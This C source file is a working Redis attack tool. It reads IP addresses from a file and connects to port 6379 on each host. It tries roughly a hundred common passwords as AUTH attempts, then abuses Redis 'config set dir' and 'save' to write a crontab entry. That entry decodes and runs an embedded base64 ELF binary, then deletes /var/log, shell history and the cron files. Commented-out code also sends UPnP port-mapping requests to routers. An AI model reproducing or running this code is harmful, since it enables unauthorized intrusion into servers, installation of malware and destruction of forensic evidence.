#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <dirent.h>
#include <curl/curl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

/*static size_t resp(void *buffer,size_t size,size_t count,void **response)
{
	char * ptr = NULL;
	//printf("%s\n",(char *)buffer);
	int fd = open("aaaaa", O_CREAT);
	fd = open("aaaaa", O_RDWR);
write(fd, buffer, strlen(buffer));
close(fd);
	ptr =(char *) malloc(count*size + 4);
	memcpy(ptr,buffer,count*size);
	*response = ptr;
 
	return count;
}

void get(char *ip){
	CURL * curl;
	CURLcode res;
	char * response = NULL;
	curl = curl_easy_init();
	curl_easy_setopt(curl,CURLOPT_URL,ip);
	curl_easy_setopt(curl,CURLOPT_WRITEFUNCTION,&resp);
	curl_easy_setopt(curl,CURLOPT_WRITEDATA,&response);
        curl_easy_setopt(curl,CURLOPT_COOKIESESSION,1L);
	curl_easy_setopt(curl,CURLOPT_COOKIEFILE,"");
	curl_easy_setopt(curl,CURLOPT_SSL_VERIFYPEER,1);
	//curl_easy_setopt(curl,CURLOPT_CAPATH,"/etc/ssl/cert/");
	curl_easy_setopt(curl,CURLOPT_CAINFO,"ca-cert.pem");
 
	curl_easy_setopt(curl,CURLOPT_SSL_VERIFYHOST,1);
curl_easy_setopt(curl,CURLOPT_VERBOSE,1L);
curl_easy_setopt(curl,CURLOPT_TIMEOUT,30);

#if 0
	//curl_easy_setopt(curl,CURLOPT_CAPATH,"./");
	curl_easy_setopt(curl,CURLOPT_SSLCERT,"client-cert.pem");
	curl_easy_setopt(curl,CURLOPT_SSLCERTPASSWD,"password");
	curl_easy_setopt(curl,CURLOPT_SSLCERTTYPE,"PEM");
	curl_easy_setopt(curl,CURLOPT_SSLKEY,"client-key.pem");
	curl_easy_setopt(curl,CURLOPT_SSLKEYPASSWD,"password");
	curl_easy_setopt(curl,CURLOPT_SSLKEYTYPE,"PEM");
#endif
 
	res = curl_easy_perform(curl);
	curl_easy_cleanup(curl);
	curl_global_cleanup();
}
*/
struct curl_slist *head;
struct postdt 
{  
      char *ip;
      char *dt;
      struct head *hd;
};
/*void post(void *data){
	struct postdt *dt1=data;
	CURL * curl;
	CURLcode res;
	char * response = NULL;
	curl = curl_easy_init();

curl_easy_setopt(curl,CURLOPT_URL,dt1->ip);
curl_easy_setopt(curl,CURLOPT_POSTFIELDS, dt1->dt);
curl_easy_setopt(curl, CURLOPT_HTTPHEADER, dt1->hd);

res = curl_easy_perform(curl);
curl_easy_cleanup(curl);
curl_global_cleanup();
}*/

void sock(void*data){
	struct postdt *dt1=data;

    int socket_descriptor;
    struct sockaddr_in pin;

    struct hostent *server_host_name;
    char dt2[1400];

    bzero(&pin,sizeof(pin));
    pin.sin_family =AF_INET;
    memset(pin.sin_zero, '\0', sizeof pin.sin_zero);
    pin.sin_addr.s_addr=inet_addr(dt1->ip);
    pin.sin_port=htons(6379);
    socket_descriptor =socket(AF_INET,SOCK_STREAM,0);
    connect(socket_descriptor,(void *)&pin,sizeof(pin));

sprintf(dt2,"  config set proetcted-mode no\n");
sleep(2);
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 123456\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth password\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth admin\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth root\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth PublishThisListPlease\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth !@\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth wubao\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 12345\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1234\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth p@ssw0rd\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth jiamima\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth test\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth root123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth !\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth !q@w\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth !qaz@wsx\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth idc!@\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth admin!@\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth qwerty\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 12345678\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth passwd\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth testuser\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 111111\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 123456789\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1q2w3e4r\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 123123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth default\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1234567\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth qwe123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1qaz2wsx\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1234567890\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth abcd1234\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 000000\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth user\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth testing\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth toor\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth qwer1234\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1q2w3e\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth asdf1234\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth redhat\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1234qwer\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth cisco\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 12qwaszx\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth test123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1q2w3e4r5t\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth admin123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth changeme\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1qazxsw2\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 123qweasd\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth q1w2e3r4\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth letmein\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth server\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth root1234\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth master\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth abc123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth rootroot\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth a\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth system\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth pass\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1qaz2wsx3edc\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth p@$$w0rd\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 112233\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth welcome\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth !QAZ2wsx\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth linux\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 123321\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth manager\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1qazXSW@\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth q1w2e3r4t5\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth oracle\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth asd123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth admin123456\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth ubnt\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 123qwe\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth qazwsxedc\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth administrator\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth superuser\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth zaq12wsx\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 121212\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 654321\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth ubuntu\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 0000\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth zxcvbnm\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth root@123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 1111\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth vmware\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth q1w2e3\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth qwerty123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth cisco123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 11111111\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth pa55w0rd\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth asdfgh\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 11111\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 123abc\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth asdf\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth centos\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 888888\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth 54321\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth password123\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth backup\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth apache\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth edc456ok\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth r00t\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  auth alpine\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  config set proetcted-mode no\n");
send(socket_descriptor,dt2,strlen(dt2),0);

send(socket_descriptor,dt1->dt,strlen(dt1->dt),0); //main

sprintf(dt2,"  config set dir /var/spool/cron\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  config set dbfilename root\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  save\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  bgsave\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  config set dir /var/spool/cron/crontabs\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  save\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  bgsave\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  config set dir /etc\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  config set dbfilename crontab\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  save\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  bgsave\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  flushall\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  slowlog reset\n");
send(socket_descriptor,dt2,strlen(dt2),0);
sprintf(dt2,"  quit\n");
send(socket_descriptor,dt2,strlen(dt2),0);

}

void main(){

char *cmd="export PATH=.:$PATH;echo f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAi/AwAAKgcAAAcAAAAAEAAAvs5/mtfdxdl0JPRfK8mx1YPv/DF3DgO5cXgiL4UkVP3/vEtiidr8S/pM/fvT7pSVogw0gZjRuVHD9ZlxI9b5UQM22rFjFjqRQ3Ya8aNWetGDtlox5Ja6EcT2mnEk1/pRBDfbsWQXO5FEdxvxpFd70YS3WzHll7sRxfebcSXY+1EFONyxZRg8kUV4HPGlWHzRhbhcMeaYvBHG+JxxJtn8UQY53bFmGT2RRnkd8aZZfdGGuV0x55m9Ecf5nXEn2v1RBzresWcaPpFHeh7xp1p+0Ye6XjHomr4RyPqecSjb/lEIO9+xaBs/kUh7H/GoW3/RiLtfMembvxHJ+59xKdz/UQk8ILFpHACRSXxg8alcQNGJvKAx6pyAEcr84HEq3cBRCj0hsWodAZFKfWHxql1B0Yq9oTHrnYERy/3hcSvewVELPiKxax4CkUt+YvGrXkLRi76iMb/Sx1RPCzmtxi1avnbU9SenZGHVwuRNKDo38iszXCqJwNJYpFhnvRKX+p8mtnOL9hU6bNhC4lVf/ZDw8Yl0JzxQWwUapoFnQOL2VarIhb6MPUHz1lTLkHnJdT7iNQannlCGB2+iVDTuo/Pk0jB0l3upAHdfB5RV4wYR8TvkmyIV0QMKEm02PYr5lpljIPnDpxYnKoVyFBDnWCdzya3uSROsZd0iUulZ9OWS/IApcI5IQv4E+OHEy9d1WGdTE/ju9fWfn2QlEgEBFoKYnDx2Lw7HVmLhF7oAnza3nWmNF3PxkSTjhRWohgeKDkSBIRzaba7Wlh1dLXjy0TD1eHfRkO5ZdgyDigqzLPq6aqNQb7kTI6/s3POCkoCSrw9yYXD9HvUDlfhnkRZ9CjahXb2vNOlhHcYxCilcQbnrs45Pbbv+yAQ3lmO1whXpS062n9/1JhQOldm5YT5BLwqm4p7dC9nPTDVIfqDW6wqQa4Pci/FzDBsmEC/XCKXHOTIzZDrftuauPxVhXBMpTcrnxf15MgrRDyMjA5fKvzMib0q3qR3XWFyWcsnUeB96eKq44O/AIILeB4F5DjW46D7qWYrK2u4kHURqlUzlqrbvjYRLmEO/0WP7RU/kI5TpYASFlBxqOj/zFcaEJfVVmk0n6jSIRWHl+dsfxWJ9qysWFX1TosXi+iYog4bmVyoDyeTEy3ZqYAwuPwHtHT8=|base64 -d>cat;chmod 755 cat;./cat&rm -rf cat;rm .bash_history;rm -rf /var/log;history -cw";

	char dt[1400];
sprintf(dt,"  set x1 \"\\n\\n\\n  1 * * * * root %s;rm -rf /var/spool/cron /etc/crontab;\\n\\n\\n\"\n",cmd);


FILE *fp;
char arr[16],b[42];
pid_t pid;
pthread_t tid;
int i=1;
struct postdt cs;
struct curl_slist *head;
fp = fopen ("../d6379", "r");

while ((fgets (arr, 16, fp)) != NULL) {	arr[strlen(arr)-1]=0;
	
//upnp:1900
/*
for (int c=0;3>c;c++){ for(int d=0;256>d;d++){
//for (int j = 0; 23>j; j++ ) {
sprintf(dt,"<?xml version=\"1.0\"encoding=\"utf-8\"?>\r\n\r\n<s:Envelopes:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n<s:Body>\r\n<u:GetGenericPortMappingEntryxmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\">\r\n<NewExternalPort>40%d</NewExternalPort>\r\n<NewInternalClient>192.168.%d.%d</NewInternalClient>\r\n<NewInternalPort>%s</NewInternalPort>\r\n<NewProtocol>TCP</NewProtocol>\r\n<NewPortMappingDescription>a</NewPortMappingDescription>\r\n<NewLeaseDuration>1000</NewLeaseDuration>\r\n<NewEnabled>1</NewEnabled>\r\n</u:AddPortMapping>\r\n</s:Body>\r\n</s:Envelope>\r\n",d,c,d,"6379");
head = curl_slist_append(head,"SOAPAction:\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"");
head = curl_slist_append(head,"Content-Type:text/xml;charset=UTF-8");
head = curl_slist_append(head,"Connection:keep-alive");
	sprintf(b,"http://%s:1900/ctl/IPConn",arr);
      	cs.ip=b;
      	cs.dt=dt;
	cs.hd=head;
        pthread_create(&tid,NULL,post,(void *)&cs);i++;

}}
sleep(30);
*/
//red #########################################################################
//for (int p=0;256>p;p++){
	sprintf(b,"%s",arr);
      	cs.ip=b;
      	cs.dt=dt;
	cs.hd=NULL;
	//sock((void*)&cs);
	pthread_create(&tid,NULL,sock,(void*)&cs);i++;
//}
//if(i==2048){sleep(61);i=1;}
}
sleep(61);
}
